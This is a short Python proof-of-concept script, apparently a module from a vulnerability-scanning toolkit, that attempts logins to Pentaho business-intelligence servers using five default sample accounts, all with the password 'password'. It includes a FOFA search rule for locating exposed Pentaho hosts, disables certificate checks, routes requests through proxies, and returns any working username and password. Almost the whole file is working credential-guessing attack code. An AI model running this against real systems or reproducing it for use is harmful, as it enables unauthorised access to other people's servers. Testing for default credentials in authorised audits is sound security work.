#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests

from Config.config_proxies import proxies
from Config.config_requests import ua

requests.packages.urllib3.disable_warnings()

# 脚本信息
######################################################
NAME = 'pentaho_bruteforce'
AUTHOR = "Trans"
REMARK = 'pentaho密码爆破'
FOFA_RULE = 'app="pentaho"'
######################################################

def poc(target):
    result={}
    url = target + "/pentaho"
    refer = url+ "/Login"
    url += "/j_spring_security_check"
    login_headers = {
        "User-Agent": ua,
        "Referer": refer
    }

    webapp_usernames = {'admin':'password', 'joe': 'password', 'suzy': 'password', 'tiffany':'password', 'pat': 'password' }
    for user in webapp_usernames:
        path_store = ['/public/plugin-samples', '/public/bi-developers']
        login_data = {"j_username": user, "j_password": webapp_usernames[user], "locale": "en_US"}
        response = requests.post(url, headers=login_headers, data=login_data,verify=False,timeout=5,proxies=proxies)
        if '/Home' in response.url:
            result['target'] = target
            result['username'] = user
            result['password'] = webapp_usernames[user]
            return result

if __name__ == '__main__':

    poc("http://127.0.0.1:3312")

